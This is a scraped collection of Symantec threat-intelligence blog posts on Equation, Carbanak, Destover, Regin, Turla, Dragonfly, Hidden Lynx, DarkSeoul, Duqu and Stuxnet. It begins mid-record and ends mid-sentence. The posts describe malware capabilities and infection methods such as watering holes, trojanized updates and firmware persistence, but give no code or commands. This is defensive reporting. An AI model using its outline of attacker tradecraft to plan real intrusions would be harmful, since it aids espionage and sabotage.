    "content": "An adept and well-resourced cyberespionage group known as Equation has been targeting organizations in a number of countries with a range of highly developed malware tools that go to great lengths to evade detection. New research from our peers at Kaspersky Lab has brought the group’s activities and tools to public attention. Symantec products detect the malware currently known to be used by Equation. The Equation group has used a range of different malware tools to mount its operations. Targeted computers are often compromised initially with malware that acts as a reconnaissance tool, gathering information about the infected computer and keeping a back door open, allowing for the installation of further malware if the computer is identified as something of interest. This is a common tactic adopted by cyberespionage groups. For example, the group behind the Turla Trojanusually initially infects its victims with the Wipbot Trojan before infecting them with Trojan Turla if it decides the computer is worthy of interest. The main tool used for this purpose appears to be Infostealer.Micstus, which is also known as “DoubleFantasy”. Trojan.Tripfant (also known as “TripleFantasy”) has similar capabilities and may be a replacement for Micstus. Equation has used a succession of advanced, multipurpose Trojans as its main malware tools. Trojan.Grayphish, which is also known as “GrayFish”, is believed to be the group’s current weapon of choice. It has a complex structure and stealthy characteristics. Grayphish includes a bootkit which allows the malware to take control of the entire Windows boot process. Highly stealthy, Grayphish uses an encrypted virtual file system hidden inside the Windows registry. This appears to have replaced the older Trojan.Equdrug (also known as “EquationDrug”) which was favored until recently. Equdrug in turn appears to have replaced the older Backdoor.Lassrv.B. Also known as “EquationLaser”, this Trojan seems to be one of the early workhorses used by the group until it was phased out. Grayphish and Equdrug have a modular structure. Aside from standard modules, a number of specialized features can also be employed. Among this is a highly sophisticated and rarely used module that allows the malware to reprogram the firmware on a range of popular hard disks, providing the attackers with a persistent presence that can survive disk reformatting. Symantec detects this module as Packed.Generic.483. In addition to these powerful Trojans, Equation has employed a number of specialist tools. Among these are Trojan.Grokey a custom keylogger (also known as “Grok”) and W32.Fanni, which is also known as “Fanny worm”. This worm’s chief purpose appears to be the targeting of air-gapped networks. It can receive commands and exfiltrate data through infected USB sticks. Fanny used two zero day exploits that were also used in the Stuxnet attacks. The exploits were used in Fanny prior to Stuxnet indicating that Equation had prior knowledge of the vulnerabilities. Another similarity lies in the fact that Stuxnet was also designed to attack air-gapped networks. ProtectionSymantec and Norton products have the following detections in place against malware used by the Equation group: Prior to this, Symantec detected Equation malware with a range of detections including Trojan.Tracur, Backdoor.Trojan, Trojan Horse, Trojan.Gen.2, and W32.Stration@mm. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/equation-cyberespionage-group"
  },
  {
    "title": "carbanak cybercrime gang",
    "content": "Symantec has been tracking the activities of the Carbanak cybercrime group for some time and our customers are protected against the malware used by this group. Carbanak, which has been the subject of media reports over the past 24 hours, is an atypical financial crime group, focused on defrauding banks rather than their customers. Symantec calls the group Silicon, but other vendors refer to it as Carbanak or Anunak. The main piece of malware that has recently been used by the group is Trojan.Carberp.B, which contains code borrowed from the older Trojan.Carberp. The group is believed to have targeted up to 100 banks and other financial institutions in multiple countries. The exact amount stolen by the Carbanak group is unknown, but estimates range from tens of millions of US dollars up to $1 billion. Carbanak is a skilled group of attackers, capable of gaining a foothold on the networks of targeted banks through malware hidden in spear-phishing emails. Once inside, the group patiently and stealthily moves across the network of a bank, gathering intelligence and compromising enough computers until it has the resources and intelligence to launch a successful attack. Carbanak has employed two main tactics to cash out. In some cases, it has transferred funds to accounts controlled by the attackers and operated by money mules. In other instances, it has compromised ATMs, hijacking them in order to dispense funds to people working for the group. Carbanak is not the first group to target ATMs. For example, research by Symantec found that attackers using Backdoor.Ploutus.B were able to compromise ATMs andempty them of cash by simply sending an SMS to the ATM. Financial institutions have been fighting malware for more than ten years, and the financial industry was the most attacked sector with 29 percent of all spear-phishing attacks in January 2015. Attackers who are motivated by financial reward quickly adapt to countermeasures, and many security implementations are ineffective at protecting against advanced attacks. It’s imperative that organizations implement layered security measures to protect against today’s advanced threats and educate employees about security policies and best practices. ProtectionSymantec and Norton products have the following detections in place against the malware used by the Carbanak group. Intrusion prevention system Advice for businesses and consumersSymantec advises users to be careful when dealing with suspicious emails and to avoid clicking on suspicious links or opening suspicious attachments. It’s also important to keep all software, including security software, up-to-date. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/carbanak-cybercrime-gang"
  },
  {
    "title": "destover destructive malware south korea",
    "content": "Backdoor.Destover, the destructive malware that was the subject of an FBI Flash Warning this week, shares several links to earlier attacks directed at targets in South Korea. Some samples of Destover report to a command-and-control (C&C) server that was also used by a version of Trojan.Volgmer crafted to attack South Korean targets. The shared C&C indicates that the same group may be behind both attacks. Volgmer is a targeted piece of malware, likely used by a single group, which has been used in limited attacks, possibly as a first stage reconnaissance tool. It can be used to gather system information and download further files for execution. Significantly, the version of Volgmer which shares a C&C with Destover was configured specifically to attack South Korean targets and will only run on Korean computers. Destover also share some techniques and component names with theJokra attacks against South Korea in 2013. However there is no hard evidence as yet to link the attacks and a copycat operation can’t be ruled out. Links also exist to theShamoon Attacks, with both attackers using the same, commercially available drivers. However, in this instance it appears highly unlikely that the same group was behind both attacks and instead it would appear that the Destover attacks copied techniques from Shamoon. Destover is a particularly damaging form of malware that is capable of completely wiping an infected computer. It was the subject of an FBI Flash Warning earlier this week after at least one variant of it was understood to have been used in a high profile attack. There are several malicious files associated with the FBI Destover report: Diskpartmg16.exe is the first file that is created on an infected computer and, when executed, it creates the files net_ver.dat and igfxtrayex.exe. When “diskpartmg16.exe” is run, it connects to a number of specific IP addresses within a set IP range, as well as computer names in the format “USSDIX[Machine Name]”. This indicates that this variant of Destover was not intended to be indiscriminate and the malware had instead been configured to only attack computers belonging to one particular organization. The destructive payload of Destover is carried by igfxtrayex.exe. In certain instances, when run, it will: Iissvr.exe, meanwhile, is a backdoor which listens on port 80. Once an attacker communicates with the compromised computer, this file displays a message, which reads: Some samples of Destover seen by Symantec link to a C&C server that has been used by variants of Trojan.Volgmer in the past. Symantec has been tracking Trojan.Volgmer for several months. Volgmer is a threat capable of opening a back door on an infected computer, which allows the malware to communicate with a C&C server to retrieve system information, execute commands, upload files, and download files for execution. Interestingly, the variants of Volgmer that share a C&C server with Destover are configured to end execution if the compromised computer’s region is not “Korea”. The Destover attackers use techniques and components, such as file names, that are similar to those used in theJokra attacks against South Korea in 2013. These attacks crippled servers belonging to several South Korean banks and broadcasting organizations and also defaced the website of a Korean telecoms firm. The malware used in the Jokra attacks contained code that did not begin wiping the hard drive until a set time period expired. Destover is also configured to perform a delayed wipe. Furthermore,media outlets in South Korea have reported that a number of similar file names were used in both attacks(Korean language link). Destover also share some commonalities with theShamoon Attacks. Both Destover and the malware used by the Shamoon attackers (W32.Disttrack) share some drivers. These are not malicious files and are commercially available drivers. While both Destover and Disttrack are destructive forms of malware, there is no evidence to suggest that the same group is behind both attacks. Symantec and Norton products detect this threat as Backdoor.Destover. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/destover-destructive-malware-south-korea"
  },
  {
    "title": "regin espionage surveillance",
    "content": "An advanced piece of malware, known as Regin, has been used in systematic spying campaigns against a range of international targets since at least 2008. A back door-type Trojan, Regin is a complex piece of malware whose structure displays a degree of technical competence rarely seen. Customizable with an extensive range of capabilities depending on the target, it provides its controllers with a powerful framework for mass surveillance and has been used in spying operations against government organizations, infrastructure operators, businesses, researchers, and private individuals. It is likely that its development took months, if not years, to complete and its authors have gone to great lengths to cover its tracks. Its capabilities and the level of resources behind Regin indicate that it is one of the main cyberespionage tools used by a nation state. As outlined in a new technical whitepaper from Symantec, Backdoor.Regin is a multi-staged threat and each stage is hidden and encrypted, with the exception of the first stage.  Executing the first stage starts a domino chain of decryption and loading of each subsequent stage for a total of five stages.  Each individual stage provides little information on the complete package. Only by acquiring all five stages is it possible to analyze and understand the threat. Regin also uses a modular approach, allowing it to load custom features tailored to the target. This modular approach has been seen in other sophisticated malware families such as Flamer and Weevil (The Mask), while the multi-stage loading architecture is similar to that seen in the Duqu/Stuxnet family of threats. Regin infections have been observed in a variety of organizations between 2008 and 2011, after which  it was abruptly withdrawn. A new version of the malware resurfaced from 2013 onwards. Targets include private companies, government entities and research institutes. Almost half of all infections  targeted private individuals and small businesses. Attacks on telecoms companies appear to be designed to gain access to calls being routed through their infrastructure. Infections are also geographically diverse, having been identified in mainly in ten different countries. The infection vector varies among targets and no reproducible vector had been found at the time of writing. Symantec believes that some targets may be tricked into visiting spoofed versions of well-known websites and the threat may be installed through a Web browser or by exploiting an application. On one computer, log files showed that Regin originated from Yahoo! Instant Messenger through an unconfirmed exploit. Regin uses a modular approach, giving flexibility to the threat operators as they can load custom features tailored to individual targets when required. Some custom payloads are very advanced and exhibit a high degree of expertise in specialist sectors, further evidence of the level of resources available to Regin’s authors. There are dozens of Regin payloads. The threat’s standard capabilities include several Remote Access Trojan (RAT) features, such as capturing screenshots, taking control of the mouse’s point-and-click functions, stealing passwords, monitoring network traffic, and recovering deleted files. More specific and advanced payload modules were also discovered, such as a Microsoft IIS web server traffic monitor and a traffic sniffer of the administration of mobile telephone base station controllers. Regin’s developers put considerable effort into making it highly inconspicuous. Its low key nature means it can potentially be used in espionage campaigns lasting several years. Even when its presence is detected, it is very difficult to ascertain what it is doing. Symantec was only able to analyze the payloads after it decrypted sample files. It has several “stealth” features. These include anti-forensics capabilities, a custom-built encrypted virtual file system (EVFS), and alternative encryption in the form of a variant of RC5, which isn’t commonly used. Regin uses multiple sophisticated means to covertly communicate with the attacker including via ICMP/ping, embedding commands in HTTP cookies, and custom TCP and UDP protocols. Regin is a highly-complex threat which has been used in systematic data collection or intelligence gathering campaigns. The development and operation of this malware would have required a significant investment of time and resources, indicating that a nation state is responsible. Its design makes it highly suited for persistent, long term surveillance operations against targets. The discovery of Regin highlights how significant investments continue to be made into the development of tools for use in intelligence gathering. Symantec believes that many components of Regin remain undiscovered and additional functionality and versions may exist.  Additional analysis continues and Symantec will post any updates on future discoveries Indicators of compromise for security administrators and more detailed and technical information can be found in our technical paper -Regin: Top-tier espionage tool enables stealthy surveillance Symantec and Norton products detect this threat as Backdoor.Regin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/regin-espionage-surveillance"
  },
  {
    "title": "turla espionage diplomats",
    "content": "A cyberespionage campaign involving malware known as Wipbot and Turla has systematically targeted the governments and embassies of a number of former Eastern Bloc countries. Trojan.Wipbot (known by other vendors as Tavdig) is a back door used to facilitate reconnaissance operations before the attackers shift to long term monitoring operations using Trojan.Turla (which is known by other vendors as Uroboros, Snake, and Carbon). It appears that this combination of malware has been used for classic espionage-type operations for at least four years. Because of the targets chosen and the advanced nature of the malware used, Symantec believes that a state-sponsored group was behind these attacks. Turla provides the attacker with powerful spying capabilities. Configured to start every time a computer starts, once the user opens a Web browser it opens a back door that enables communication with the attackers. Through this back door, the attackers can copy files from the infected computer, connect to servers, delete files, and load and execute other forms of malware, among other capabilities. The group behind Turla has a two-pronged attack strategy that involves infecting victims through spear phishing emails and watering hole attacks. The watering hole attacks display competent compromise capabilities, with the attackers compromising a range of legitimate websites and only delivering malware to victims visiting from pre-selected IP address ranges. These compromised websites deliver a payload of Trojan.Wipbot. It is highly likely that Wipbot is then used as a downloader to deliver Turla to the victim. While infections initially appeared to be spread over a range of European countries, closer analysis revealed that many infections in Western Europe occurred on computers that were connected to private government networks of former Eastern Bloc countries. These infections appear to have transpired in the embassies of these countries. Analysis of infections revealed that the attackers were heavily focused on a small number of countries. For example, in May of 2012, the office of the prime minister of a former Soviet Union member country was infected. This infection spread rapidly and up to 60 computers at the prime minister’s office were compromised. Another attack saw a computer at the embassy to France of a second former Soviet Union member infected in late 2012. During 2013, infections began to spread to other computers linked to the network of this country’s ministry of foreign affairs. In addition, its ministry of internal affairs was also infected.  Further investigation uncovered a systematic spying campaign targeted at its diplomatic service. Infections were discovered at embassies in Belgium, Ukraine, China, Jordan, Greece, Kazakhstan, Armenia, Poland, and Germany. At least five other countries in the region were targeted by similar attacks. While the attackers have largely focused on the former Eastern Bloc, a number of other targets were also found. These included the ministry for health of a Western European country, the ministry for education of a Central American country, a state electrical authority in the Middle East, and a medical organization in the US. Prior to publication, Symantec notified all relevant national authorities, such as Computer Emergency Response Centers (CERTs) that handle and respond to Internet security incidents. The group behind Turla uses spear phishing emails and watering hole attacks to infect victims. Some of the spear phishing emails purported to come from a military attaché at a Middle Eastern embassy and had an attachment masquerading as the minutes of meetings. Opening the attachment resulted in Trojan.Wipbot being dropped on to the victim’s computer. It is believed that Wipbot may be the delivery mechanism for Turla as they share several similarities in code and structure. Since September 2012, the group has compromised at least 84 legitimate websites to facilitate watering hole attacks. Websites owned by a number of different governments and international agencies were among those compromised by the attackers. Visitors to these sites were being redirected to Web servers where a ‘fingerprinting’ script was executed. This script collected some identifying information about the visitor’s computer. This phase of the campaign appeared to serve as an intelligence trawl, gathering information about what browsers and plugins website visitors were using, which would help identify which exploits would work best against them. The next phase of the operation was highly targeted, with servers then configured to drop Wipbot only to IP addresses associated with intended targets. In one instance, the malware delivered was disguised as a Shockwave installer bundle. Wipbot was then used to gather further information about the infected computer. If the attackers deemed the victim of interest, it appears likely that a second back door (Trojan.Turla) with far greater capabilities was downloaded on to the victim’s computer. Wipbot appears to act as a reconnaissance tool, while Turla is used to maintain a long term presence on the victim’s computer. Analysis conducted by Symantec has found several technical connections between Wipbot and Turla which indicates the same group or larger organization wrote both pieces of code. Symantec has been tracking the activities of the group behind Turla for a number of years. The identity of the attackers has yet to be established, although timestamps from activity associated with the attacks indicate that most activity occurs during the standard working day of the UTC +4 time zone. Turla is an evolution of an older piece of malware, Trojan.Minit, which has been in operation since 2004. The current campaign is the work of a well-resourced and technically competent attack group that is capable of penetrating many network defenses. It is focused on targets that would be of interest to a nation state, with spying and theft of sensitive data among its objectives. Symantec has the following detection in place for the malware used in these attacks: Update – January 22, 2015:Symantec Security Response has published a whitepaper containing more information about the attack group behind this campaign and detailed indicators of compromise for the malware involved. Download a copy of the paper entitled:The Waterbug Attack Group The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/turla-espionage-diplomats"
  },
  {
    "title": "dragonfly energy companies sabotage",
    "content": "An ongoing cyberespionage campaign against a range of targets, mainly in the energy sector, gave attackers the ability to mount sabotage operations against their victims. The attackers, known to Symantec as Dragonfly, managed to compromise a number of strategically important organizations for spying purposes and, if they had used the sabotage capabilities open to them, could have caused damage or disruption to energy supplies in affected countries. Among the targets of Dragonfly were energy grid operators, major electricity generation firms, petroleum pipeline operators, and energy industry industrial equipment providers. The majority of the victims were located in the United States, Spain, France, Italy, Germany, Turkey, and Poland. The Dragonfly group is well resourced, with a range of malware tools at its disposal and is capable of launching attacks through a number of different vectors. Its most ambitious attack campaign saw it compromise a number of industrial control system (ICS) equipment providers, infecting their software with a remote access-type Trojan. This caused companies to install the malware when downloading software updates for computers running ICS equipment. These infections not only gave the attackers a beachhead in the targeted organizations’ networks, but also gave them the means to mount sabotage operations against infected ICS computers. This campaign follows in the footsteps of Stuxnet, which was the first known major malware campaign to target ICS systems. While Stuxnet was narrowly targeted at the Iranian nuclear program and had sabotage as its primary goal, Dragonfly appears to have a much broader focus with espionage and persistent access as its current objective with sabotage as an optional capability if required. In addition to compromising ICS software, Dragonfly has used spam email campaigns and watering hole attacks to infect targeted organizations. The group has used two main malware tools: Backdoor.Oldrea and Trojan.Karagany. The former appears to be a custom piece of malware, either written by or for the attackers. Prior to publication, Symantec notified affected victims and relevant national authorities, such as Computer Emergency Response Centers (CERTs) that handle and respond to Internet security incidents. The Dragonfly group, which is also known by other vendors as Energetic Bear, appears to have been in operation since at least 2011 and may have been active even longer than that. Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus mainly to US and European energy firms in early 2013. The campaign against the European and American energy sector quickly expanded in scope. The group initially began sending malware in phishing emails to personnel in target firms. Later, the group added watering hole attacks to its offensive, compromising websites likely to be visited by those working in energy in order to redirect them to websites hosting an exploit kit. The exploit kit in turn delivered malware to the victim’s computer. The third phase of the campaign was the Trojanizing of legitimate software bundles belonging to three different ICS equipment manufacturers. Dragonfly bears the hallmarks of a state-sponsored operation, displaying a high degree of technical capability. The group is able to mount attacks through multiple vectors and compromise numerous third party websites in the process. Dragonfly has targeted multiple organizations in the energy sector over a long period of time. Its current main motive appears to be cyberespionage, with potential for sabotage a definite secondary capability. Analysis of the compilation timestamps on the malware used by the attackers indicate that the group mostly worked between Monday and Friday, with activity mainly concentrated in a nine-hour period that corresponded to a 9am to 6pm working day in the UTC +4 time zone. Based on this information, it is likely the attackers are based in Eastern Europe. Dragonfly uses two main pieces of malware in its attacks. Both are remote access tool (RAT) type malware which provide the attackers with access and control of compromised computers. Dragonfly’s favored malware tool is Backdoor.Oldrea, which is also known as Havex or the Energetic Bear RAT. Oldrea acts as a back door for the attackers on to the victim’s computer, allowing them to extract data and install further malware. Oldrea appears to be custom malware, either written by the group itself or created for it. This provides some indication of the capabilities and resources behind the Dragonfly group. Once installed on a victim’s computer, Oldrea gathers system information, along with lists of files, programs installed, and root of available drives. It will also extract data from the computer’s Outlook address book and VPN configuration files. This data is then written to a temporary file in an encrypted format before being sent to a remote command-and-control (C&C) server controlled by the attackers. The majority of C&C servers appear to be hosted on compromised servers running content management systems, indicating that the attackers may have used the same exploit to gain control of each server. Oldrea has a basic control panel which allows an authenticated user to download a compressed version of the stolen data for each particular victim. The second main tool used by Dragonfly is Trojan.Karagany. Unlike Oldrea, Karagany was available on the underground market. The source code for version 1 of Karagany was leaked in 2010. Symantec believes that Dragonfly may have taken this source code and modified it for its own use. This version is detected by Symantec as Trojan.Karagany!gen1. Karagany is capable of uploading stolen data, downloading new files, and running executable files on an infected computer. It is also capable of running additional plugins, such as tools for collecting passwords, taking screenshots, and cataloging documents on infected computers. Symantec found that the majority of computers compromised by the attackers were infected with Oldrea. Karagany was only used in around 5 percent of infections. The two pieces of malware are similar in functionality and what prompts the attackers to choose one tool over another remains unknown. The Dragonfly group has used at least three infection tactics against targets in the energy sector. The earliest method was an email campaign, which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment. Infected emails had one of two subject lines: “The account” or “Settlement of delivery problem”. All of the emails were from a single Gmail address. The spam campaign began in February 2013 and continued into June 2013. Symantec identified seven different organizations targeted in this campaign. The number of emails sent to each organization ranged from one to 84. The attackers then shifted their focus to watering hole attacks, comprising a number of energy-related websites and injecting an iframe into each which redirected visitors to another compromised legitimate website hosting the Lightsout exploit kit. Lightsout exploits either Java or Internet Explorer in order to drop Oldrea or Karagany on the victim’s computer. The fact that the attackers compromised multiple legitimate websites for each stage of the operation is further evidence that the group has strong technical capabilities. In September 2013, Dragonfly began using a new version of this exploit kit, known as the Hello exploit kit. The landing page for this kit contains JavaScript which fingerprints the system, identifying installed browser plugins. The victim is then redirected to a URL which in turn determines the best exploit to use based on the information collected. The most ambitious attack vector used by Dragonfly was the compromise of a number of legitimate software packages. Three different ICS equipment providers were targeted and malware was inserted into the software bundles they had made available for download on their websites. All three companies made equipment that is used in a number of industrial sectors, including energy. The first identified Trojanized software was a product used to provide VPN access to programmable logic controller (PLC) type devices. The vendor discovered the attack shortly after it was mounted, but there had already been 250 unique downloads of the compromised software. The second company to be compromised was a European manufacturer of specialist PLC type devices. In this instance, a software package containing a driver for one of its devices was compromised. Symantec estimates that the Trojanized software was available for download for at least six weeks in June and July 2013. The third firm attacked was a European company which develops systems to manage wind turbines, biogas plants, and other energy infrastructure. Symantec believes that compromised software may have been available for download for approximately ten days in April 2014. The Dragonfly group is technically adept and able to think strategically. Given the size of some of its targets, the group found a “soft underbelly” by compromising their suppliers, which are invariably smaller, less protected companies. ProtectionSymantec has the following detections in place that will protect customers running up to date versions of our products from the malware used in these attacks: Intrusion Prevention Signatures For further technical details on the Dragonfly attacks,please read our whitepaper. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/dragonfly-energy-companies-sabotage"
  },
  {
    "title": "hidden lynx professional hackers hire",
    "content": "For the past few years, reports have continued to emerge detailing the activities of actors behind various targeted attacks or Advanced Persistent Threats (APTs). Here at Symantec Security Response, we’ve been keeping our eyes on a group that we believe are among the best of breed. We’ve given them the name of Hidden Lynx—after a string that was found in the command and control server communications. This group has a hunger and drive that surpass other well-known groups such as APT1/Comment Crew. Key characteristics of this group are: These attributes are shown by the relentless campaigns waged against multiple concurrent targets over a sustained period of time. They are the pioneers of the “watering hole” technique used to ambush targets, they have early access to zero-day vulnerabilities, and they have the tenacity and patience of an intelligent hunter to compromise the supply chain to get at the true target. These supply chain attacks are carried out by infecting computers at a supplier of an intended target and then waiting for the infected computers to be installed and call home, clearly these are cool calculated actions rather than impulsive forays of amateurs. This group doesn’t just limit itself to a handful of targets; instead it targets hundreds of different organizations in many different regions, even concurrently. Given the breadth and number of targets and regions involved, we infer that this group is most likely a professional hacker-for-hire operation that are contracted by clients to provide information. They steal on demand, whatever their clients are interested in, hence the wide variety and range of targets. We also believe that to carry out attacks of this scale, the group must have considerable hacking expertise at its disposal, perhaps 50 to 100 operatives are employed and organized into at least two distinct teams both tasked with carrying out different activities using different tools and techniques. These types of attacks require time and effort to carry out, some of the campaigns require research and intelligence gathering before any successful attacks can be mounted. At the front line of this group is a team that uses disposable tools along with basic but effective techniques to attack many different targets. They may also act as intelligence collectors too. This team we call Team Moudoor after the name of the Trojan that they use. Moudoor is a back door Trojan that the team uses liberally without worry about discovery by security firms. The other team acts like a special operations unit, elite personnel used to crack the most valuable or toughest targets. The elite team uses a Trojan named Naid and are therefore referred to as Team Naid. Unlike Moudoor, the Naid Trojan is used sparingly and with care to avoid detection and capture, like a secret weapon that is only used when failure is not an option. Since 2011, we have observed at least six significant campaigns by this group. The most notable of these campaigns is the VOHO attack campaign of June, 2012. What was particularly interesting about this attack was the use of the watering hole attack technique and the compromise of Bit9’s trusted file signing infrastructure. The VOHO campaign was ultimately targeting US defense contractors whose systems were protected by Bit9’s trust-based protection software but when the Hidden Lynx attackers’ progress was blocked by this obstacle, they reconsidered their options and found that the best way around the protection was to compromise the heart of the protection system itself and subvert it for their own purpose. This is exactly what they did when they diverted their attention to Bit9 and breached their systems. Once breached, the attackers quickly found their way into the file signing infrastructure that was the foundation of the Bit9 protection model, they then used this system to sign a number of malware files and then these files were used in turn to compromise the true intended targets. For those interested in more in-depth information, we havepublished a whitepaperthat describes the group and the attack campaigns carried out by them. We have also put together an infographic that summarizes the key information about this prolific Hidden Lynx group. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/hidden-lynx-professional-hackers-hire"
  },
  {
    "title": "darkseoul cyberattacks south korea",
    "content": "Yesterday, June 25, the Korean peninsula observed a series of cyberattacks coinciding with the 63rd anniversary of the start of the Korean War. While multiple attacks were conducted by multiple perpetrators, one of the distributed denial-of-service (DDoS) attacks observed yesterday against South Korean government websites can be directly linked to the DarkSeoul gang and Trojan.Castov. We can now attribute multiple previous high-profile attacks to the DarkSeoul gang over the last 4 years against South Korea, in addition to yesterday’s attack. These attacks include the devastatingJokra attacksin March 2013 that wiped numerous computer hard drives at South Korean banks and television broadcasters, as well as theattacks on South Korean financial companiesin May 2013. Conducting DDoS attacks and hard disk wiping on key historical dates is not new for the DarkSeoul gang. They previously conducted DDoS and wiping attacks on the United States Independence Day as well. The DarkSeoul gang’s attacks tend to follow similar methods of operation. Trademarks of their attacks include: The attacks conducted by the DarkSeoul gang have required intelligence and coordination, and in some cases have demonstrated technical sophistication. While nation-state attribution is difficult, South Koreanmedia reportshave pointed to an investigation which concluded the attackers were working on behalf of North Korea. Symantec expects the DarkSeoul attacks to continue and, regardless of whether the gang is working on behalf of North Korea or not, the attacks are both politically motivated and have the necessary financial support to continue acts of cybersabotage on organizations in South Korea. Cybersabotage attacks on a national scale have been rare—Stuxnet and Shamoon (W32.Disttrack) are the other two main examples. However, the DarkSeoul gang is almost unique in its ability to carry out such high-profile and damaging attacks over several years. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/darkseoul-cyberattacks-south-korea"
  },
  {
    "title": "duqu next stuxnet",
    "content": "On October 14, 2011, a research lab with strong international connections alerted us to a sample that appeared to be very similar to Stuxnet. They named the threat \"Duqu\" [dyü-kyü] because it creates files with the file name prefix “~DQ”. The research lab provided us with samples recovered from computer systems located in Europe, as well as a detailed report with their initial findings, including analysis comparing the threat to Stuxnet, which we were able to confirm. Parts of Duqu are nearly identical to Stuxnet, but with a completely different purpose. Duqu is essentially the precursor to a future Stuxnet-like attack. The threat was written by the same authors (or those that have access to the Stuxnet source code) and appears to have been created since the last Stuxnet file was recovered. Duqu's purpose is to gather intelligence data and assets from entities, such as industrial control system manufacturers, in order to more easily conduct a future attack against another third party. The attackers are looking for information such as design documents that could help them mount a future attack on an industrial control facility. Duqu does not contain any code related to industrial control systems and is primarily a remote access Trojan (RAT). The threat does not self-replicate. Our telemetry shows the threat was highly targeted toward a limited number of organizations for their specific assets. However, it’s possible that other attacks are being conducted against other organizations in a similar manner with currently undetected variants. The attackers used Duqu to install another infostealer that could record keystrokes and gain other system information. The attackers were searching for assets that could be used in a future attack. In one case, the attackers did not appear to successfully exfiltrate any sensitive data, but details are not available in all cases. Two variants were recovered, and in reviewing our archive of submissions, the first recording of one of the binaries was on September 1, 2011. However, based on file compile times, attacks using these variants may have been conducted as early as December 2010. One of the variant’s driver files was signed with a valid digital certificate that expires August 2, 2012. The digital certificate belongs to a company headquartered in Taipei, Taiwan. The certificate was revoked on October 14, 2011. Duqu uses HTTP and HTTPS to communicate with a command-and-control (C&C) server that at the time of writing is still operational. The attackers were able to download additional executables through the C&C server, including an infostealer that can perform actions such as enumerating the network, recording keystrokes, and gathering system information. The information is logged to a lightly encrypted and compressed local file, which then must be exfiltrated out. The threat uses a custom C&C protocol, primarily downloading or uploading what appear to be JPG files. However, in addition to transferring dummy JPG files, additional data for exfiltration is encrypted and sent, and likewise received. Finally, the threat is configured to run for 36 days. After 36 days, the threat will automatically remove itself from the system. Duqu shares a great deal of code with Stuxnet; however, the payload is completely different. Instead of a payload designed to sabotage an industrial control system, the payload has been replaced with general remote access capabilities. The creators of Duqu had access to the source code of Stuxnet, not just the Stuxnet binaries. The attackers intend to use this capability to gather intelligence from a private entity to aid future attacks on a third party. While suspected, no similar precursor files have been recovered that predate the Stuxnet attacks. You can find additional details inour paper here. The research lab that originally found the sample has allowed us to share their initial report as an appendix. We expect to make further updates over the coming days.Key points: Note: At press time we have recovered additional variants from an additional organization in Europe with a compilation time of October 17, 2011. These variants have not yet been analyzed. More information will follow. Update [October 18, 2011] -Symantec has known that some of the malware files associated with the W32.Duqu threat were signed with private keys associated with a code signing certificate issued to a Symantec customer. Symantec revoked the customer certificate in question on October 14, 2011. Our investigation into the key’s usage leads us to the conclusion that the private key used for signing Duqu was stolen, and not fraudulently generated for the purpose of this malware. At no time were Symantec’s roots and intermediate CAs at risk, nor were there any issues with any CA, intermediate, or other VeriSign or Thawte brands of certificates. Our investigation shows zero evidence of any risk to our systems; we used the correct processes to authenticate and issue the certificate in question to a legitimate customer in Taiwan. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/duqu-next-stuxnet"
  },
  {
    "title": "stuxnet dossier espionage",
    "content": "We’re pleased to announce that we’ve compiled the results of many weeks of fast-paced analysis of Stuxnet into awhite paper entitled the W32.Stuxnet Dossier. On top of finding elements we described in the ongoing Stuxnet summer blog series, you will find all technical details about the threat’s components and data structures, as well as high-level information, including: The paper is scheduled to be delivered at the Virus Bulletin 2010 conference and can be downloaded here. Our investigations into Stuxnet started on July 13 of this year when the Symantec Security Response team began a journey full of surprises, wrong turns, frustrating moments, and moments of validation. Virusblokada, a security company in Belarus, announced they found a new interesting malware sample using an unpatched vulnerability to spread to removable drives and much of the media focused on the zero-day vulnerability. However, there was much more. Soon people began describing a threat now known as Stuxnet as a tool for cyber espionage stealing design data for industrial control systems, such as gas pipelines and power plants. Stuxnet then had difficulty shedding those initial reports with most only noting its use of a zero-day exploit and its ability to potentially steal design documents. Only more recently did the general public realize Stuxnet’s ultimate goal was to sabotage an industrial control system. Analyzing Stuxnet has been one of the most challenging issues we have worked on. The code is sophisticated, incredibly large, required numerous experts in different fields, and mostly bug-free, which is rare for your average piece of malware. Stuxnet is clearly not average. We estimate the core team was five to ten people and they developed Stuxnet over six months. The development was in all likelihood highly organized and thus this estimate doesn’t include the quality assurance and management resources needed to organize the development as well as a probable host of other resources required, such as people to setup test systems to mirror the target environment and 